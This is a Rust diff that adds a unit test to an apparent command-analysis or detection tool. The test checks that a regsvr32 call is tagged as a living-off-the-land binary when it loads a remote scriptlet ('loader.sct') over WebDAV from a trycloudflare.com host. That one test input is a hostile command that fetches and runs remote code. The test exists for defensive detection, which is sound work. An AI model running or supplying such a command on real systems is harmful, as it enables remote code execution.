@@ -8474,6 +8474,28 @@ mod regsvr32_tests {
             env.traits
         );
     }
+
+    #[test]
+    fn regsvr32_unc_webdav_target_emits_lolbas_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"regsvr32 /s \\travel-sagem-distant-potential.trycloudflare.com@SSL\DavWWWRoot\loader.sct"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Lolbas { name, cmd }
+                    if name == "regsvr32"
+                        && cmd.contains(r#"\\travel-sagem-distant-potential.trycloudflare.com@SSL\DavWWWRoot\loader.sct"#)
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 UNC/WebDAV target not typed: {:?}",
+            env.traits
+        );
+    }
 }
 
 #[cfg(test)]
